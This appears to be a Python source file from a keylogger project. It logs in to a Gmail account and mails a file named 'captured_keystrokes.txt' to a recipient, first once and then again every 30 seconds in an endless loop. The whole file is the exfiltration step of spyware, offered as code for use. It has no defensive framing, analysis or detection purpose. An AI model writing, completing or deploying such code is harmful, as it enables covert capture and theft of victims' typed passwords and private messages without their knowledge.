import time
from email_login import login_email
from email_functions import send_keystrokes_email

def main():
    # Email credentials
    email = 'youremail@gmail.com'
    password = 'gmailappcode'

    # Log in to the email account
    server = login_email(email, password)

    if server:
        # Sender's email credentials
        sender_email = 'yourgmail@gmail.com'

        # Recipient's email address
        recipient_email = 'receiver@gmail.com'

        # Email details
        subject = 'Captured Keystrokes'
        message = 'Please find attached the captured keystrokes file.'

        # File path of the captured keystrokes file
        file_path = 'captured_keystrokes.txt'

        # Send the initial email with the captured keystrokes file
        send_keystrokes_email(server, sender_email, recipient_email, subject, message, file_path)

        # Close the connection
        server.quit()

        # Send the captured keystrokes file every 30 seconds
        while True:
            time.sleep(30)
            server = login_email(email, password)
            if server:
                send_keystrokes_email(server, sender_email, recipient_email, subject, message, file_path)
                server.quit()

if __name__ == '__main__':
    main()
